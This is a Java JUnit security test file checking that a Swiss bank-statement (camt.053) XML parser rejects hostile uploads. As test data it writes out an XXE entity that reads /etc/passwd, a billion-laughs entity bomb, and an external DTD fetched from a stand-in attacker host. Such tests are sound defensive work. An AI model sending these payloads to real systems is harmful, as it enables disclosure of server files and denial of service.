package ch.finyo.transaction;

import ch.finyo.common.DocumentProcessingException;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * XML attack-surface tests for CamtParser: DTDs (external entities / XXE,
 * billion laughs, external DTD references) must be rejected outright and
 * entity content must never surface anywhere — files are untrusted uploads.
 */
class CamtParserSecurityTest {

    private final CamtParser parser = new CamtParser();

    private static byte[] bytes(String xml) {
        return xml.getBytes(StandardCharsets.UTF_8);
    }

    @Test
    void external_entity_doctype_is_rejected_and_never_resolved() {
        byte[] xml = bytes("""
                <?xml version="1.0"?>
                <!DOCTYPE Document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <Document>
                  <BkToCstmrStmt><Stmt>
                    <Ntry>
                      <Amt Ccy="CHF">1.00</Amt>
                      <CdtDbtInd>DBIT</CdtDbtInd>
                      <Sts>BOOK</Sts>
                      <BookgDt><Dt>2025-01-01</Dt></BookgDt>
                      <AddtlNtryInf>&xxe;</AddtlNtryInf>
                    </Ntry>
                  </Stmt></BkToCstmrStmt>
                </Document>
                """);

        assertThatThrownBy(() -> parser.parse(xml))
                .isInstanceOf(DocumentProcessingException.class)
                // the exception must not leak file contents either
                .hasMessageNotContaining("root:")
                .hasMessageNotContaining("passwd");
    }

    @Test
    void billion_laughs_entity_bomb_is_rejected() {
        byte[] xml = bytes("""
                <?xml version="1.0"?>
                <!DOCTYPE Document [
                  <!ENTITY lol "lol">
                  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
                  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
                  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
                  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
                  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
                ]>
                <Document><BkToCstmrStmt><Stmt>
                  <Ntry><AddtlNtryInf>&lol5;</AddtlNtryInf></Ntry>
                </Stmt></BkToCstmrStmt></Document>
                """);

        assertThatThrownBy(() -> parser.parse(xml))
                .isInstanceOf(DocumentProcessingException.class);
    }

    @Test
    void external_dtd_reference_is_rejected() {
        byte[] xml = bytes("""
                <?xml version="1.0"?>
                <!DOCTYPE Document SYSTEM "http://evil.example/statement.dtd">
                <Document><BkToCstmrStmt><Stmt/></BkToCstmrStmt></Document>
                """);

        assertThatThrownBy(() -> parser.parse(xml))
                .isInstanceOf(DocumentProcessingException.class);
    }

    @Test
    void xml_with_a_foreign_root_element_is_rejected() {
        byte[] xml = bytes("""
                <?xml version="1.0"?>
                <html><body>not a bank statement</body></html>
                """);

        assertThatThrownBy(() -> parser.parse(xml))
                .isInstanceOf(DocumentProcessingException.class)
                .hasMessageContaining("not a camt.053");
    }

    @Test
    void document_root_without_a_statement_is_rejected() {
        // e.g. a pain.001 payment file also uses a Document root
        byte[] xml = bytes("""
                <?xml version="1.0"?>
                <Document xmlns="urn:iso:std:iso:20022:tech:xsd:pain.001.001.09">
                  <CstmrCdtTrfInitn><GrpHdr><MsgId>SYNTH-PAIN-1</MsgId></GrpHdr></CstmrCdtTrfInitn>
                </Document>
                """);

        assertThatThrownBy(() -> parser.parse(xml))
                .isInstanceOf(DocumentProcessingException.class)
                .hasMessageContaining("not a camt.053");
    }

    @Test
    void garbage_bytes_are_rejected() {
        byte[] garbage = {0x00, (byte) 0x91, (byte) 0xFF, 0x13, 0x37, (byte) 0xC0, (byte) 0xDE};

        assertThatThrownBy(() -> parser.parse(garbage))
                .isInstanceOf(DocumentProcessingException.class);
    }
}
